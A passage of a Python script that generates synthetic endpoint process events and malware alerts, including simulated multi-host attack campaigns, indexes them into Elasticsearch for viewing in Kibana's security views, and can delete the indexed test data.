                "args": process_info["args"],
                "args_count": len(process_info["args"]),
                "working_directory": process_info["working_dir"],
                "start": base_timestamp_ms - ((len(scenario["processes"]) - i) * 1000),
                "uptime": 0,
                "interactive": True,
                "user": {
                    "id": "0" if process_info["user"] == "root" else "1000",
                    "name": process_info["user"],
                },
                "group": {
                    "id": "0" if process_info["user"] == "root" else "1000",
                    "name": process_info["user"],
                },
                "tty": {"char_device": {"major": 8, "minor": 1}},
                "hash": {"md5": process_hash},
                "code_signature": {"status": "trusted", "subject_name": "Microsoft"},
                "session_leader": {
                    "entity_id": session_leader_id,
                    "name": scenario["processes"][0]["name"],
                    "pid": 100 + random.randint(0, 50),
                    "interactive": True,
                    "user": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "group": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "working_directory": scenario["processes"][0]["working_dir"],
                    "executable": scenario["processes"][0]["executable"],
                    "command_line": " ".join(scenario["processes"][0]["args"]),
                    "args": scenario["processes"][0]["args"],
                    "args_count": len(scenario["processes"][0]["args"]),
                    "start": base_timestamp_ms - (len(scenario["processes"]) * 1000),
                    "tty": {"char_device": {"major": 8, "minor": 1}},
                },
                "entry_leader": {
                    "entity_id": session_leader_id,
                    "name": scenario["processes"][0]["name"],
                    "pid": 100 + random.randint(0, 50),
                    "interactive": True,
                    "user": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "group": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "working_directory": scenario["processes"][0]["working_dir"],
                    "executable": scenario["processes"][0]["executable"],
                    "command_line": " ".join(scenario["processes"][0]["args"]),
                    "args": scenario["processes"][0]["args"],
                    "args_count": len(scenario["processes"][0]["args"]),
                    "start": ["1970-01-01T00:00:00.000Z"],
                    "tty": {"char_device": {"major": 8, "minor": 1}},
                },
                "group_leader": {
                    "entity_id": session_leader_id,
                    "name": scenario["processes"][0]["name"],
                    "pid": 100 + random.randint(0, 50),
                    "interactive": True,
                    "user": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "group": {"id": "0", "name": scenario["processes"][0]["user"]},
                    "working_directory": scenario["processes"][0]["working_dir"],
                    "executable": scenario["processes"][0]["executable"],
                    "command_line": " ".join(scenario["processes"][0]["args"]),
                    "args": scenario["processes"][0]["args"],
                    "args_count": len(scenario["processes"][0]["args"]),
                    "start": base_timestamp_ms - (len(scenario["processes"]) * 1000),
                    "tty": {"char_device": {"major": 8, "minor": 1}},
                },
                "Ext": {"ancestry": ancestry},
            },
            "host": {
                "hostname": hostname,
                "name": hostname,
                "os": {"family": "linux", "name": "Linux", "platform": "linux"},
            },
            "user": {
                "id": "0" if process_info["user"] == "root" else "1000",
                "name": process_info["user"],
            },
            "group": {
                "id": "0" if process_info["user"] == "root" else "1000",
                "name": process_info["user"],
            },
            "data_stream": {
                "type": "logs",
                "dataset": "endpoint.events.process",
                "namespace": "default",
            },
        }

        # Add parent info if not the root
        if parent_info:
            event["process"]["parent"] = {
                "entity_id": entity_ids[i - 1],
                "pid": 100 + ((i - 1) * 1000) + random.randint(0, 100),
                "user": {
                    "id": "0" if parent_info["user"] == "root" else "1000",
                    "name": parent_info["user"],
                },
                "group": {
                    "id": "0" if parent_info["user"] == "root" else "1000",
                    "name": parent_info["user"],
                },
                "interactive": True,
                "name": parent_info["name"],
                "executable": parent_info["executable"],
                "command_line": " ".join(parent_info["args"]),
                "args": parent_info["args"],
                "args_count": len(parent_info["args"]),
                "working_directory": parent_info["working_dir"],
                "start": base_timestamp_ms
                - ((len(scenario["processes"]) - i + 1) * 1000),
                "tty": {"char_device": {"major": 8, "minor": 1}},
            }

        events.append(event)

    return events


def generate_endpoint_alert(alert):
    """
    Generate an endpoint alert from the detection rule alert.

    Returns:
        dict: Endpoint alert with event.kind="alert"
    """
    endpoint_alert = {
        "@timestamp": alert["@timestamp"],
        "agent": alert["agent"],
        "ecs": alert["ecs"],
        "event": {
            "action": "creation",
            "kind": "alert",
            "category": ["malware"],
            "code": "malicious_file",
            "id": generate_uuid(),
            "dataset": "endpoint",
            "module": "endpoint",
            "type": ["creation"],
            "sequence": random.randint(1, 100),
        },
        "file": alert["file"],
        "process": alert["process"],
        "host": alert["host"],
        "user": {"id": "0", "name": "root"},
        "group": {"id": "0", "name": "root"},
        "data_stream": {
            "type": "logs",
            "dataset": "endpoint.alerts",
            "namespace": "default",
        },
    }

    return endpoint_alert


# ===========================
# INDEXING FUNCTIONS
# ===========================
def index_events_and_endpoint_alert(events, endpoint_alert):
    """
    Index process events and endpoint alert using the bulk API.

    Returns:
        dict: Elasticsearch bulk API response or None on error
    """
    url = f"{ELASTIC_URL}/_bulk"

    bulk_body = ""

    for event in events:
        bulk_body += (
            json.dumps({"create": {"_index": "logs-endpoint.events.process-default"}})
            + "\n"
        )
        bulk_body += json.dumps(event) + "\n"

    bulk_body += (
        json.dumps({"create": {"_index": "logs-endpoint.alerts-default"}}) + "\n"
    )
    bulk_body += json.dumps(endpoint_alert) + "\n"

    response = requests.post(
        url,
        auth=(USERNAME, PASSWORD),
        headers={"Content-Type": "application/x-ndjson"},
        data=bulk_body,
        verify=True,
    )

    if response.status_code in [200, 201]:
        result = response.json()
        if not result.get("errors"):
            return result
        else:
            print("⚠️  Some documents failed to index")
            for item in result.get("items", []):
                if "error" in item.get("create", {}):
                    print(f"   Error: {item['create']['error']}")
            return result
    else:
        print(f"❌ Failed to index documents: {response.status_code}")
        print(f"Response: {response.text}")
        return None


def index_alert(alert):
    """
    Index the detection rule alert to the internal Kibana alerts index.

    Returns:
        dict: Elasticsearch index response or None on error
    """
    url = f"{ELASTIC_URL}/{ALERTS_INDEX}/_doc"

    response = requests.post(
        url,
        auth=(USERNAME, PASSWORD),
        headers={"Content-Type": "application/json"},
        json=alert,
        verify=True,
    )

    if response.status_code in [200, 201]:
        return response.json()
    else:
        print(f"❌ Failed to index alert: {response.status_code}")
        print(f"Response: {response.text}")
        return None


# ===========================
# DELETE FUNCTIONS
# ===========================
def delete_all_data():
    """
    Delete all data from Elasticsearch indices used by this script:
    - .alerts-security.alerts-default (Kibana alerts)
    - logs-endpoint.events.process-* (Process events)
    - logs-endpoint.alerts-* (Endpoint alerts)

    Returns:
        dict: Summary of deletion results
    """
    print("=" * 70)
    print("🗑️  DELETING ALL DATA FROM ELASTICSEARCH")
    print("=" * 70)
    print(f"Target: {ELASTIC_URL}\n")

    results = {
        "alerts_index": {"success": False, "deleted_count": 0},
        "process_events": {"success": False, "deleted_count": 0},
        "endpoint_alerts": {"success": False, "deleted_count": 0},
    }

    # Delete from Kibana alerts index
    print(f"Deleting from {ALERTS_INDEX}...")
    url = f"{ELASTIC_URL}/{ALERTS_INDEX}/_delete_by_query"
    payload = {"query": {"match_all": {}}}

    try:
        response = requests.post(
            url,
            auth=(USERNAME, PASSWORD),
            headers={"Content-Type": "application/json"},
            json=payload,
            verify=True,
            params={"refresh": "true"},
        )

        if response.status_code in [200, 201]:
            result = response.json()
            deleted_count = result.get("deleted", 0)
            results["alerts_index"]["success"] = True
            results["alerts_index"]["deleted_count"] = deleted_count
            print(f"  ✅ Deleted {deleted_count} documents from {ALERTS_INDEX}")
        else:
            # Index might not exist, which is fine
            if response.status_code == 404:
                print(f"  ⚠️  Index {ALERTS_INDEX} does not exist (skipping)")
            else:
                print(f"  ❌ Failed: {response.status_code}")
                print(f"     Response: {response.text}")
    except Exception as e:
        print(f"  ❌ Error: {e}")

    # Delete from process events indices (handle data streams with pattern)
    print("\nDeleting from logs-endpoint.events.process-*...")
    url = f"{ELASTIC_URL}/logs-endpoint.events.process-*/_delete_by_query"
    payload = {"query": {"match_all": {}}}

    try:
        response = requests.post(
            url,
            auth=(USERNAME, PASSWORD),
            headers={"Content-Type": "application/json"},
            json=payload,
            verify=True,
            params={"refresh": "true"},
        )

        if response.status_code in [200, 201]:
            result = response.json()
            deleted_count = result.get("deleted", 0)
            results["process_events"]["success"] = True
            results["process_events"]["deleted_count"] = deleted_count
            print(f"  ✅ Deleted {deleted_count} documents from process events indices")
        else:
            if response.status_code == 404:
                print("  ⚠️  No process events indices found (skipping)")
            else:
                print(f"  ❌ Failed: {response.status_code}")
                print(f"     Response: {response.text}")
    except Exception as e:
        print(f"  ❌ Error: {e}")

    # Delete from endpoint alerts indices (handle data streams with pattern)
    print("\nDeleting from logs-endpoint.alerts-*...")
    url = f"{ELASTIC_URL}/logs-endpoint.alerts-*/_delete_by_query"
    payload = {"query": {"match_all": {}}}

    try:
        response = requests.post(
            url,
            auth=(USERNAME, PASSWORD),
            headers={"Content-Type": "application/json"},
            json=payload,
            verify=True,
            params={"refresh": "true"},
        )

        if response.status_code in [200, 201]:
            result = response.json()
            deleted_count = result.get("deleted", 0)
            results["endpoint_alerts"]["success"] = True
            results["endpoint_alerts"]["deleted_count"] = deleted_count
            print(
                f"  ✅ Deleted {deleted_count} documents from endpoint alerts indices"
            )
        else:
            if response.status_code == 404:
                print("  ⚠️  No endpoint alerts indices found (skipping)")
            else:
                print(f"  ❌ Failed: {response.status_code}")
                print(f"     Response: {response.text}")
    except Exception as e:
        print(f"  ❌ Error: {e}")

    # Print summary
    print("\n" + "=" * 70)
    print("📊 DELETION SUMMARY")
    print("=" * 70)
    total_deleted = (
        results["alerts_index"]["deleted_count"]
        + results["process_events"]["deleted_count"]
        + results["endpoint_alerts"]["deleted_count"]
    )
    print(f"Total documents deleted: {total_deleted}")
    print(f"  - Alerts: {results['alerts_index']['deleted_count']}")
    print(f"  - Process events: {results['process_events']['deleted_count']}")
    print(f"  - Endpoint alerts: {results['endpoint_alerts']['deleted_count']}")

    if total_deleted > 0:
        print("\n✅ All data deleted successfully")
    else:
        print("\n⚠️  No data found to delete (indices may be empty or not exist)")

    return results


# ===========================
# BATCH GENERATION
# ===========================
def generate_multiple_alerts(
    count,
    dry_run=False,
    output_file=None,
    campaign_mode=False,
    campaign_hosts=5,
    time_spread="minutes",
    working_hours=False,
    attack_speed="medium",
    scenarios=None,
):
    """
    Generate multiple varied alerts based on different attack scenarios.

    Args:
        count: Number of alerts to generate
        dry_run: If True, generate but don't index
        output_file: If provided, save alerts to JSON file
        campaign_mode: If True, generate correlated campaign
        campaign_hosts: Number of hosts in campaign
        time_spread: Time distribution type (minutes/hours/days/weeks)
        working_hours: Weight alerts to business hours
        attack_speed: Campaign speed (fast/medium/slow)
        scenarios: Optional list of scenarios (uses defaults if None)

    Returns:
        list: List of generated alert data with results
    """
    if scenarios is None:
        scenarios = get_attack_scenarios()

    results = []
    campaign = None
    phase_counts = {"initial": 0, "execution": 0, "lateral": 0, "exfiltration": 0}

    # Create campaign if in campaign mode
    if campaign_mode:
        campaign = create_campaign(campaign_hosts)
        print(f"\n🎯 Generating Campaign: {campaign.id}")
        print(f"   Attacker IP: {campaign.attacker_ip}")
        print(f"   C2 Server: {campaign.c2_domain} ({campaign.c2_ip})")
        print(f"   Malware Family: {campaign.malware_family}")
        print(f"   Target Hosts: {campaign_hosts}")
        print(f"   Attack Speed: {attack_speed}")
        print()

    print(f"\n🔄 Generating {count} varied security alerts...")
    print("=" * 70)

    for i in range(count):
        # Determine attack phase for campaign mode
        if campaign_mode:
            # Distribute alerts across phases
            progress = i / count
            if progress < 0.1:
                phase = "initial"
            elif progress < 0.4:
                phase = "execution"
            elif progress < 0.8:
                phase = "lateral"
            else:
                phase = "exfiltration"

            phase_counts[phase] += 1

            # Select scenario appropriate for phase
            scenario = select_campaign_scenario(phase, scenarios)

            # Get timestamp offset based on phase and attack speed
            min_offset, max_offset = get_campaign_phase_offset(phase, attack_speed)
            timestamp_offset = random.randint(min_offset, max_offset)

            # Use campaign host
            hostname = random.choice(campaign.target_hosts)
        else:
            # Random scenario selection
            scenario = random.choice(scenarios)

            # Calculate timestamp offset based on time spread
            timestamp_offset = calculate_timestamp_offset(
                i, count, time_spread, working_hours
            )

            # Generate unique hostname
            hostname = generate_random_hostname()

        # Generate unique agent ID
        agent_id = generate_uuid()

        # Generate the detection rule alert (with campaign context if applicable)
        alert, entity_ids = generate_varied_alert(
            scenario, hostname, agent_id, timestamp_offset, campaign
        )

        # Generate process events
        events = generate_varied_process_events(
            scenario, entity_ids, hostname, agent_id, timestamp_offset
        )

        # Generate endpoint alert
        endpoint_alert = generate_endpoint_alert(alert)

        # Store for output
        alert_data = {
            "alert_number": i + 1,
            "scenario": scenario["name"],
            "hostname": hostname,
            "severity": scenario["severity"],
            "process_count": len(events),
            "malware_file": scenario["malware_file"]["name"],
            "detection_alert": alert,
            "process_events": events,
            "endpoint_alert": endpoint_alert,
        }

        # Add campaign info if in campaign mode
        if campaign_mode:
            alert_data["phase"] = phase
            alert_data["campaign_id"] = campaign.id

        if not dry_run:
            # Index to Elasticsearch
            events_result = index_events_and_endpoint_alert(events, endpoint_alert)
            alert_result = index_alert(alert)

            if events_result and alert_result:
                alert_data["indexed"] = True
                alert_data["alert_id"] = alert_result.get("_id")
                status = "✅"
            else:
                alert_data["indexed"] = False
                status = "❌"
        else:
            alert_data["indexed"] = False
            status = "📝"

        # Print progress
        if campaign_mode:
            print(
                f"{status} Alert {i+1}/{count}: {phase:12s} | {scenario['name']:25s} | "
                f"Host: {hostname:20s} | Severity: {scenario['severity']:8s}"
            )
        else:
            print(
                f"{status} Alert {i+1}/{count}: {scenario['name']:25s} | "
                f"Host: {hostname:20s} | Severity: {scenario['severity']:8s} | "
                f"Processes: {len(events)}"
            )

        results.append(alert_data)

    # Save to file if requested
    if output_file:
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n💾 Alerts saved to: {output_file}")

    # Return results with campaign info if applicable
    return {
        "alerts": results,
        "campaign": campaign,
        "phase_counts": phase_counts if campaign_mode else None,
    }


# ===========================
# MAIN EXECUTION
# ===========================
def main():
    parser = argparse.ArgumentParser(
        description="Generate multiple varied security alerts for Elastic Cloud",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Delete all logs and alerts from Elasticsearch
  python generate_multiple_alerts_cloud.py --delete-all

  # Generate 20 alerts and preview before indexing
  python generate_multiple_alerts_cloud.py --count 20

  # Generate and index immediately
  python generate_multiple_alerts_cloud.py --count 20 --index-all

  # Dry run - generate without indexing
  python generate_multiple_alerts_cloud.py --count 5 --dry-run

  # Save to file
  python generate_multiple_alerts_cloud.py --count 10 --output alerts.json

  # Generate a campaign with 10 hosts over a slow timeline
  python generate_multiple_alerts_cloud.py --count 30 --campaign --campaign-hosts 10 --attack-speed slow

  # Generate alerts spread over a week with business hours weighting
  python generate_multiple_alerts_cloud.py --count 50 --time-spread days --working-hours

  # Use custom scenarios from a file
  python generate_multiple_alerts_cloud.py --count 20 --scenarios-file custom_scenarios.yaml

  # Full campaign mode with all features
  python generate_multiple_alerts_cloud.py --count 100 --campaign --campaign-hosts 15 \\
    --attack-speed medium --time-spread hours --working-hours --index-all
        """,
    )

    parser.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of alerts to generate (default: 10)",
    )

    parser.add_argument(
        "--index-all",
        action="store_true",
        help="Index all alerts immediately without preview",
    )

    parser.add_argument(
        "--dry-run", action="store_true", help="Generate alerts but don't index them"
    )

    parser.add_argument("--output", type=str, help="Save generated alerts to JSON file")

    parser.add_argument(
        "--delete-all",
        action="store_true",
        help="Delete all data (logs and alerts) from Elasticsearch indices",
    )

    # Configuration file support
    parser.add_argument(
        "--scenarios-file",
        type=str,
        help="Load scenarios from YAML file",
    )

    # Campaign mode
    parser.add_argument(
        "--campaign",
        action="store_true",
        help="Generate correlated attack campaign",
    )

    parser.add_argument(
        "--campaign-hosts",
        type=int,
        default=5,
        help="Number of hosts in campaign (default: 5)",
    )

    # Time distribution
    parser.add_argument(
        "--time-spread",
        type=str,
        choices=["minutes", "hours", "days", "weeks"],
        default="minutes",
        help="Time range for alert distribution (default: minutes)",
    )

    parser.add_argument(
        "--working-hours",
        action="store_true",
        help="Weight alerts to business hours (8am-6pm)",
    )

    parser.add_argument(
        "--timezone",
        type=str,
        default="UTC",
        help="Timezone for working hours (default: UTC)",
    )

    parser.add_argument(
        "--attack-speed",
        type=str,
        choices=["fast", "medium", "slow"],
        default="medium",
        help="Campaign attack speed: fast (minutes), medium (hours), slow (days) (default: medium)",
    )

    args = parser.parse_args()

    # Handle delete-all command first (exit after deletion)
    if args.delete_all:
        delete_all_data()
        return

    print("=" * 70)
    print("MULTIPLE SECURITY ALERTS GENERATOR - ELASTIC CLOUD")
    print("=" * 70)
    print(f"Target: {ELASTIC_URL}")
    print(f"Alert count: {args.count}")
    print(f"Mode: {'Dry Run' if args.dry_run else 'Index to Elasticsearch'}")
    print(f"Time spread: {args.time_spread}")
    if args.working_hours:
        print("Working hours: Enabled (weighted to business hours)")
    if args.campaign:
        print(
            f"Campaign mode: Enabled ({args.campaign_hosts} hosts, {args.attack_speed} speed)"
        )

    # Load scenarios (from file or defaults)
    scenarios = None
    if args.scenarios_file:
        scenarios = load_scenarios_from_file(args.scenarios_file)
        if scenarios is None:
            print("❌ Failed to load scenarios file, exiting")
            return

    # Generate alerts
    result_data = generate_multiple_alerts(
        count=args.count,
        dry_run=args.dry_run,
        output_file=args.output,
        campaign_mode=args.campaign,
        campaign_hosts=args.campaign_hosts,
        time_spread=args.time_spread,
        working_hours=args.working_hours,
        attack_speed=args.attack_speed,
        scenarios=scenarios,
    )

    results = result_data["alerts"]
    campaign = result_data["campaign"]
    phase_counts = result_data["phase_counts"]

    # Print summary
    print("\n" + "=" * 70)
    print("📊 GENERATION SUMMARY")
    print("=" * 70)

    # Campaign-specific summary
    if args.campaign and campaign:
        print("\n🎯 Campaign Details:")
        print(f"  Campaign ID: {campaign.id}")
        print(f"  Attacker IP: {campaign.attacker_ip}")
        print(f"  C2 Server: {campaign.c2_domain} ({campaign.c2_ip})")
        print(f"  Malware Family: {campaign.malware_family}")
        print(f"  Affected Hosts: {len(campaign.target_hosts)}")
        print("    - " + "\n    - ".join(campaign.target_hosts))

        # Calculate time span
        timestamps = [
            datetime.fromisoformat(
                r["detection_alert"]["@timestamp"].replace("Z", "+00:00")
            )
            for r in results
        ]
        if timestamps:
            time_span = max(timestamps) - min(timestamps)
            hours = time_span.total_seconds() / 3600
            if hours < 1:
                print(f"  Time Span: {int(time_span.total_seconds() / 60)} minutes")
            elif hours < 24:
                print(f"  Time Span: {hours:.1f} hours")
            else:
                print(f"  Time Span: {hours / 24:.1f} days")

        print("\n  Phase Distribution:")
        max_count = max(phase_counts.values()) if phase_counts else 1
        for phase, count in phase_counts.items():
            bar_length = int((count / max_count) * 30)
            bar = "█" * bar_length
            print(f"    {phase:15s} [{bar:30s}] {count:3d} alerts")

    # Count by scenario
    scenario_counts = {}
    severity_counts = {}
    for result in results:
        scenario = result["scenario"]
        severity = result["severity"]
        scenario_counts[scenario] = scenario_counts.get(scenario, 0) + 1
        severity_counts[severity] = severity_counts.get(severity, 0) + 1

    print("\nScenario Distribution:")
    for scenario, count in sorted(scenario_counts.items()):
        print(f"  {scenario:30s}: {count:3d} alerts")

    print("\nSeverity Distribution:")
    for severity, count in sorted(severity_counts.items()):
        print(f"  {severity:10s}: {count:3d} alerts")

    if not args.dry_run:
        indexed_count = sum(1 for r in results if r.get("indexed", False))
        print(f"\n✅ Successfully indexed: {indexed_count}/{args.count} alerts")

        print("\n📊 To view in Kibana:")
        print("   1. Go to Security → Alerts")
        print("   2. Filter by 'Endpoint Security' rule")
        print("   3. Click on any alert to view details")
        print("\n🔍 To view Session View/Analyzer:")
        print("   1. Open an alert")
        print("   2. Click 'Visualize' tab")
        print("   3. Toggle between Session View and Analyzer Graph")
    else:
        print(f"\n📝 Dry run complete - {args.count} alerts generated (not indexed)")


if __name__ == "__main__":
    main()
